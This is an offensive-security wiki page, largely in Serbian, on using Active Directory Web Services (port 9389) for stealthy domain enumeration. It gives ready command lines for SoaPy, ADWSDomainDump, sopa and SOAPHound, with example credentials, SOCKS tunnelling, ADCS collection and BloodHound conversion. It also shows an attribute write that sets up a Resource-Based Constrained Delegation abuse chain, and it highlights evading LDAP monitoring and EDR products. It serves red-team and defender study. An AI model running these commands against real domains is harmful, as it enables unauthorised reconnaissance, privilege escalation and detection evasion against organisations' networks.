# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## What is ADWS?

Active Directory Web Services (ADWS) je **omogućen po defaultu na svakom Domain Controller-u od Windows Server 2008 R2** i sluša na TCP **9389**. Uprkos imenu, **nema HTTP-a**. Umesto toga, servis izlaže podatke u LDAP stilu kroz sloj proprietarnih .NET framing protokola:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Pošto je saobraćaj enkapsuliran unutar ovih binarnih SOAP frejmova i ide preko neuobičajenog porta, **enumeration through ADWS je mnogo manje verovatno da će biti inspektovan, filtriran ili signature-ovan nego klasični LDAP/389 & 636 saobraćaj**. Za operatore ovo znači:

* Stealthier recon – Blue teams često fokusiraju na LDAP upite.
* Mogućnost prikupljanja sa **non-Windows hosts (Linux, macOS)** tunelovanjem 9389/TCP preko SOCKS proxy-ja.
* Iste podatke koje biste dobili preko LDAP-a (users, groups, ACLs, schema, itd.) i mogućnost izvođenja **writes** (npr. `msDs-AllowedToActOnBehalfOfOtherIdentity` za **RBCD**).

ADWS interakcije su implementirane preko WS-Enumeration: svaki upit počinje sa `Enumerate` porukom koja definiše LDAP filter/atribute i vraća `EnumerationContext` GUID, a zatim slede jedna ili više `Pull` poruka koje stream-uju do server-definisanog prozora rezultata. Context-i isteknu posle ~30 minuta, tako da tooling mora da paginira rezultate ili deli filtere (prefix upiti po CN) da bi izbegao gubitak state-a. Kada tražite security descriptor-e, specificirajte `LDAP_SERVER_SD_FLAGS_OID` control da izostavite SACL-ove, u suprotnom ADWS jednostavno uklanja `nTSecurityDescriptor` atribut iz SOAP odgovora.

> NOTE: ADWS se takođe koristi od strane mnogih RSAT GUI/PowerShell alata, pa se saobraćaj može stopiti sa legitimnim admin aktivnostima.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) je **potpuna re-implementacija ADWS protocol stack-a u čistom Python-u**. Kreira NBFX/NBFSE/NNS/NMF frejmove bajt-po-bajt, omogućavajući prikupljanje sa Unix-like sistema bez dodirivanja .NET runtime-a.

### Key Features

* Podržava **proxying through SOCKS** (korisno sa C2 implants).
* Fino-granularni search filteri identični LDAP `-q '(objectClass=user)'`.
* Opcionalne **write** operacije ( `--set` / `--delete` ).
* **BOFHound output mode** za direktan import u BloodHound.
* `--parse` flag za lepše formatiranje timestamps / `userAccountControl` kada je potrebna čitljivost za ljude.

### Targeted collection flags & write operations

SoaPy dolazi sa kuriranim prekidačima koji repliciraju najčešće LDAP hunting zadatke preko ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, plus raw `--query` / `--filter` opcije za custom pulls. Kombinujte to sa write primitivima kao što su `--rbcd <source>` (postavlja `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN staging za targeted Kerberoasting) i `--asrep` (flip `DONT_REQ_PREAUTH` u `userAccountControl`).

Example targeted SPN hunt that only returns `samAccountName` and `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Koristite isti host/credentials da odmah weaponizujete nalaze: dump RBCD-capable objects with `--rbcds`, zatim primenite `--rbcd 'WEBSRV01$' --account 'FILE01$'` da postavite Resource-Based Constrained Delegation chain (see [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) for the full abuse path).

### Instalacija (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump preko ADWS (Linux/Windows)

* Fork of `ldapdomaindump` koji zamenjuje LDAP upite ADWS pozivima na TCP/9389 kako bi smanjio LDAP-signature hitove.
* Izvodi inicijalnu proveru dostupnosti porta 9389 osim ako nije prosleđen `--force` (preskače probe ako su skeniranja portova bučna/filtrirana).
* Testirano protiv Microsoft Defender for Endpoint i CrowdStrike Falcon sa uspešnim bypass-om u README.

### Instalacija
```bash
pipx install .
```
### Upotreba
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
Tipični izlaz beleži proveru dostupnosti porta 9389, ADWS bind i početak/kraj dump-a:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - praktičan klijent za ADWS u Golangu

Slično kao soapy, [sopa](https://github.com/Macmod/sopa) implementira ADWS protocol stack (MS-NNS + MC-NMF + SOAP) u Golangu, izlažući komandne opcije za slanje ADWS poziva kao što su:

* **Pretraga i dohvat objekata** - `query` / `get`
* **Životni ciklus objekta** - `create [user|computer|group|ou|container|custom]` i `delete`
* **Uređivanje atributa** - `attr [add|replace|delete]`
* **Upravljanje nalozima** - `set-password` / `change-password`
* i drugi kao što su `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, itd.

### Istaknuto mapiranje protokola

* LDAP-stil pretrage se izvode putem **WS-Enumeration** (`Enumerate` + `Pull`) sa projekcijom atributa, kontrolom opsega (Base/OneLevel/Subtree) i paginacijom.
* Dohvat pojedinačnog objekta koristi **WS-Transfer** `Get`; izmene atributa koriste `Put`; brisanja koriste `Delete`.
* Ugrađeno kreiranje objekata koristi **WS-Transfer ResourceFactory**; prilagođeni objekti koriste **IMDA AddRequest** zasnovan na YAML šablonima.
* Operacije lozinki su **MS-ADCAP** akcije (`SetPassword`, `ChangePassword`).

### Neautentifikovano otkrivanje metapodataka (mex)

ADWS izlaže WS-MetadataExchange bez kredencijala, što je brz način da se potvrdi izloženost pre autentifikacije:
```bash
sopa mex --dc <DC>
```
### DNS/DC discovery & Kerberos targeting napomene

Sopa može da rezolvira DCs preko SRV ako je `--dc` izostavljen i `--domain` naveden. Izvršava upite u ovom redosledu i koristi cilj sa najvišim prioritetom:
```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```
Operativno, preferirajte resolver koji kontroliše DC da biste izbegli greške u segmentiranim okruženjima:

* Koristite `--dns <DC-IP>` tako da **svi** SRV/PTR/forward upiti prolaze kroz DC DNS.
* Koristite `--dns-tcp` kada je UDP blokiran ili su SRV odgovori veliki.
* Ako je Kerberos omogućen i `--dc` je IP, sopa izvršava **reverse PTR** da bi dobio FQDN za pravilno ciljanje SPN/KDC. Ako Kerberos nije u upotrebi, ne vrši se PTR upit.

Primer (IP + Kerberos, prisiljen DNS preko DC):
```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```
### Opcije autentifikacionog materijala

Pored lozinki u običnom tekstu, sopa podržava **NT hashes**, **Kerberos AES keys**, **ccache**, i **PKINIT certificates** (PFX or PEM) za ADWS autentifikaciju. Kerberos se podrazumeva kada se koriste `--aes-key`, `-c` (ccache) ili opcije zasnovane na sertifikatima.
```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```
### Kreiranje prilagođenih objekata putem predložaka

Za proizvoljne klase objekata, komanda `create custom` koristi YAML predložak koji se mapira na IMDA `AddRequest`:

* `parentDN` i `rdn` definišu kontejner i relativni DN.
* `attributes[].name` podržava `cn` ili namespaced `addata:cn`.
* `attributes[].type` dozvoljava `string|int|bool|base64|hex` ili eksplicitni `xsd:*`.
* Do **not** include `ad:relativeDistinguishedName` or `ad:container-hierarchy-parent`; sopa injects them.
* `hex` vrednosti se pretvaraju u `xsd:base64Binary`; koristite `value: ""` da postavite prazne stringove.

## SOAPHound – prikupljanje velikog obima za ADWS (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) je .NET alat koji održava sve LDAP interakcije unutar ADWS i emituje BloodHound v4-kompatibilan JSON. Napravi kompletnu keš memoriju `objectSid`, `objectGUID`, `distinguishedName` i `objectClass` jednom (`--buildcache`), a zatim je ponovo koristi za visokobrojne `--bhdump`, `--certdump` (ADCS) ili `--dnsdump` (AD-integrated DNS) prolaze tako da samo ~35 kritičnih atributa napušta DC. AutoSplit (`--autosplit --threshold <N>`) automatski deli upite po CN prefiksu kako bi ostao ispod 30-minutnog EnumerationContext timeout-a u velikim šumama.

Tipičan postupak na operatorovoj VM pridruženoj domenu:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Izvezeni JSON slotovi se direktno ubacuju u SharpHound/BloodHound workflows—see [BloodHound methodology](bloodhound.md) for downstream graphing ideas. AutoSplit čini SOAPHound otpornim na šume sa više miliona objekata, a broj upita ostaje niži od ADExplorer-style snapshots.

## Stealth AD Collection Workflow

Sledeći workflow pokazuje kako da enumerišete **domain & ADCS objects** preko ADWS, konvertujete ih u BloodHound JSON i tražite puteve napada zasnovane na sertifikatima – sve sa Linux-a:

1. **Tunelujte 9389/TCP** sa ciljne mreže na vašu mašinu (npr. preko Chisel, Meterpreter, SSH dynamic port-forward, itd.). Postavite `export HTTPS_PROXY=socks5://127.0.0.1:1080` ili koristite SoaPy’s `--proxyHost/--proxyPort`.

2. **Sakupite root domain object:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Prikupite objekte vezane za ADCS iz Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Konvertuj u BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Otpremite ZIP** u BloodHound GUI i pokrenite cypher upite kao što je `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` da otkrijete putanje eskalacije sertifikata (ESC1, ESC8, itd.).

### Pisanje `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Kombinujte ovo sa `s4u2proxy`/`Rubeus /getticket` za potpun **Resource-Based Constrained Delegation** lanac (pogledajte [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Sažetak alata

| Svrha | Alat | Napomene |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| High-volume ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Converts SoaPy/ldapsearch logs |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | Can be proxied through same SOCKS |
| ADWS enumeration & object changes | [sopa](https://github.com/Macmod/sopa) | Generic client to interface with known ADWS endpoints - allows for enumeration, object creation, attribute modifications, and password changes |

## References

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
* [Sopa GitHub](https://github.com/Macmod/sopa)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
